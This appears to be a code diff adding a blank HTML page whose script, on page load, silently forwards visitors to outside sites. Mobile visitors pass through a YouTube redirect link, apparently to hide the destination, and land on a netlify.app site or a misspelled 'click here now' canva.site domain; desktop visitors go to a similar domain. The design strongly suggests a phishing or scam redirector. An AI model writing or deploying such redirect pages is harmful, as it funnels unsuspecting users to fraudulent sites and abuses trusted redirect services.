@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+        <script type="text/javascript">
+            window.onload = function() {
+
+                var desktopFallback = "https://clivckhnerevnow.my.canva.site",
+                mobileFallback = "https://clickhverevnnow.my.canva.site",
+                app = "vnd.youtube:www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqbkpWSjJPQ0hZYl85SkZsVGVzajZQeWMtTmhSd3xBQ3Jtc0trNXRSZTU4TVcyVjczWUFQT0dyVGM5VDh0SmQ5N3UxREw3VkM2NVNTYTVWc2docmJadkpna1BYOWNKME5fT3pQSW02YmllSGRVYkVBdFRGODRPYTdNSXFGWDBkbWVYNU9ZMlprMVlXZTBDVnRsamt6WQ&q=https%3A%2F%2Fclassy-kashata-551341.netlify.app%2F&html_redirect=1";
+
+                if( /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ) {
+                    window.location = app;
+                    window.setTimeout(function() {
+                        window.location = mobileFallback;
+                    }, 25);
+                } else {
+                    window.location = desktopFallback;
+                }
+
+                function killPopup() {
+                    window.removeEventListener('pagehide', killPopup);
+                }
+
+                window.addEventListener('pagehide', killPopup);
+
+            };
+        </script>
+    </body>
+</html>
